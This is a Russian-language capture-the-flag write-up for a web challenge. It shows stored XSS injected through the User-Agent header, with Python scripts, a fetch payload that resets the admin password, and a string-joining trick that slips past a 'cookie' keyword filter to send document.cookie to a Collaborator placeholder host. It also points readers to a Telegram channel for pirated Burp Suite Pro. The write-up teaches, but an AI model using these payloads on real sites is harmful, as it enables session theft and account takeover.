**level**: **Hard**
**Description**: Воображение важнее, чем знания
**IP**: 62.173.140.174:16035



![[Pasted image 20240312215659.png]]
Первое что видим - форма логин/регистрации
Пробуем создать аккаунт, а также понимаем что скорее всего нужно будет получить доступ к аккаунту админа.

Изучаем html код на наличие подсказок, скрытых функций и тд.
![[Pasted image 20240312220201.png]]


<!-- Send Post request with parameter newpassword .... -->
Отлично, какой-то скрытый функционал, позже мы к нему вернемся.
Исследуем далее.

![[Pasted image 20240312215812.png]]Видим личный кабинет  с "failed login attempts", изучим функционал сервиса, произведем попытку логина с неправильным паролем с другого браузера или с режима инкогнито.
![[Pasted image 20240312220022.png]]Получаем такую картину.
Попробуем XSS payload, зарегистрируем пользователя с логином:
````javascript 
<script>alert(1)</script>
````
````XSS, или межсайтовый скриптинг, — это тип атаки на веб-приложения, при котором злоумышленник может внедрять в содержимое веб-страницы вредоносный скрипт, который будет выполняться на стороне клиента. Это может привести к краже данных, сессий или даже полному контролю над учетной записью жертвы. Рассмотрим возможные пути кражи аккаунта через XSS и методологию предотвращения таких атак.````


![[Pasted image 20240312220615.png]]Также пробуем зайти вне с неправильным паролем, и видим что XSS-уязвимость есть, это нам поможет захватить аккаунт пользователя запустив на нем javascript code, если сможем послать наш пейлоад.

Но изменить имя admin на пейлоад нельзя, но не будем забывать что есть еще другие поля, которые тоже скорее всего подвержены XSS-атаке.
На поле id, username, IP, Date мы повлиять не можем, они генерируются на сервере, а вот на User-Agent запросто!

Для этого напишем скрипт на python, он нам очень пригодится в будущем.

# Проведение атаки
````python 
import requests

payload = "<script>alert(1);</script>" # это пейлоад

user = "asdf" #Тут наш username
headers = {'User-Agent': payload} # Вставляем его в хедер
data = {"username":user, "password":"aboba"}


response = requests.post('http://62.173.140.174:16035/login.php', headers=headers, data=data) # Совершаем попытку логина с неверным паролем
 
print(response.status_code)# Выводим информацию
#print(response.text) 
````

![[Pasted image 20240312231514.png]]
Отлично, у нас получилось внедрить свой код.
### Возможные пути кражи аккаунта через XSS:

1. **Кража cookies**: Скрипт может быть направлен на чтение cookies браузера пользователя, включая сессионные токены, которые затем отправляются злоумышленнику. Используя эти данные, злоумышленник может подделать сессию пользователя и получить доступ к его аккаунту.
    
2. **Phishing**: Вредоносный скрипт может перенаправить пользователя на поддельную страницу входа, где жертва, не подозревая обмана, введет свои учетные данные, которые будут перехвачены злоумышленником.
    
3. **Манипуляции с DOM**: Злоумышленник может изменять содержимое веб-страницы в реальном времени, вставляя вредоносные формы или изменяя существующие, чтобы перехватывать данные, вводимые пользователем.
    
4. **Кража токенов аутентификации**: Многие веб-приложения используют токены для подтверждения действий пользователя. XSS может быть использован для кражи этих токенов, позволяя злоумышленнику выполнять действия от имени пользователя.


Давайте рассмотрим 2 варианта проведения таких атак.

# Первый способ (такое)
Залогинимся и попробуем отправить с помощью Javascript запрос о смене пароля

````javascript 
fetch('/index.php', {
  method: 'POST', // Указание на то, что это POST-запрос
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded', // Тип контента, отправляемого на сервер
  },
  body: 'newpassword=1234' // Данные, которые нужно отправить
})
.then(response => {
  if (response.ok) {
    return response.text(); // или response.json(), если ожидается JSON-ответ
  }
  throw new Error('Network response was not ok.');
})
.then(data => console.log(data)) // Обработка данных, полученных в ответе
.catch(error => console.error('There was a problem with your fetch operation:', error));
````

![[Pasted image 20240312235929.png]]F12 -> console
Вставляем и смотрим. При след логине пароль и в правду поменяется на 1234, отлично. Давайте модифицируем наш скрипт для того, чтобы оправлять данный код в payload.
````python 
import requests

newpassword = "<script>fetch('/index.php', {method: 'POST', headers: {'Content-Type': 'application/x-www-form-urlencoded',},body: 'newpassword=12345'})</script>"


user = "asdf" 
headers = {'User-Agent': newpassword}
data = {"username":user, "password":"aboba"}


response = requests.post('http://62.173.140.174:16035/login.php', headers=headers, data=data)
 
print(response.status_code)
#print(response.text)
````
Все прошло замечательно. При просмотре страницы, у аккаунта меняется пароль. Поменяем ```user="asdf"``` на ```user=admin``` и оправим.

При решении тасков на клиент-часть, держим в голове, что скорее всего страницу периодически будет посещать чекер. По другому аккаунт с использованием XSS просто не угнать, поэтому закидываем несколько атак, через примерно 10-15 секунд, и пробуем логинится.
![[Pasted image 20240313000841.png]]
Готово, теперь разберем способ для настоящих мужчин.
# Второй способ (мужской)
Для данного способа вам потребуется ```Burp Suite Pro```. Почему именно PRO?
Потому, что там есть ```Collaborator```, которого нет в бесплатной версии. 
Переходим по ссылке ``` https://t.me/pt_soft``` чтобы "КУПИТЬ" нашу лицензию.
В поиске по каналу в телеге ищем **Burpsuite**. И устанавливаем.

## Проработка мужской атаки

После поиска в гугл по запросу "XSS steal cookie payloads" и изучения результатов понимаем что нам нужно захватить ```document.cookie``` **значение**.

Пробуем простой alert();

````python 
import requests


payload = '<script>alert(document.cookie);</script>'

user = "asdf" 
headers = {'User-Agent': payload}
data = {"username":user, "password":"aboba"}


response = requests.post('http://62.173.140.174:16035/login.php', headers=headers, data=data)
 
print(response.status_code)
print(response.text)
````
И сталкиваемся с проблемой
![[Pasted image 20240313002008.png]]
Все отработало, но вот alert'a нет. А это все потому, что на Codeby.games есть похожий таск, и автор данного решил чтобы все было не так просто, применить фильтрацию на серверной части на слово ```cookie```.
Мы это тоже обойдем, нужно просто немного **подумать**.
## Обход фильтрации
Не забываем, что у нас есть неограниченный доступ к **javascript** на клиентской части.
в функции alert() нам нужно вывести document.cookie.
Попробуем сделать это с помощью переменных.
Необязательно транспортировать слово cookie именно как слово, можно его собрать из массива!
````javascript
const vv = ["coo", "kie"].join(""); # передаем его раздельно и с помощью join собираем в одно слово
alert(document[vv]); # не забываем что document это обьект, и к его значениям можно обращаться не только через точку, но и через [значение]
````
Пробуем этот payload.
````python 
import requests


payload = '<script>const vv = ["coo", "kie"].join("");alert(document[vv]);</script>'

user = "asdf" 
headers = {'User-Agent': payload}
data = {"username":user, "password":"aboba"}


response = requests.post('http://62.173.140.174:16035/login.php', headers=headers, data=data)
 
print(response.status_code)
print(response.text)
````
![[Pasted image 20240313002825.png]]**Отлично**!
Вспоминаем зачем нам потребовался коллаборатор в бурпе.
Данное значение, которое только вывели в alert, мы будем ловить на его **сервер**.

Для понимания как это работает.
![[Pasted image 20240313003642.png]]
1) Переходим в вкладку
2) Копируем **url**
3) Переходим по ней в google
4) Нажимаем **Poll now**, чтобы получить с сервера данные.
5) Если окошко как на фото снизу не появляется, то нажмите на "+. Это создаст новую сессию и обновит окошко.
![[Pasted image 20240313003239.png]]
Мы только что поймали наш request и можем его детально рассмотреть.
Эта функция заменит нам ngrok или свой белый IP и сервер, очень удобно.
Копируем и вставляем в скрипт.


````python 
import requests


payload = '<script>const vv = ["coo", "kie"].join(""); var payload = `https://{{СЮДА}}/?${vv}=` + document[vv]; fetch(payload);</script>'

user = "admin" 
headers = {'User-Agent': payload}
data = {"username":user, "password":"aboba"}


response = requests.post('http://62.173.140.174:16035/login.php', headers=headers, data=data)
 
print(response.status_code)
print(response.text)
````

Отправляем, ждем, пуллим.
![[Pasted image 20240313004232.png]]
Вуаля! Подставим значение PHPSESSID в наш браузер. 
![[Pasted image 20240313004351.png]]![[Pasted image 20240313004408.png]]
На сегодня все!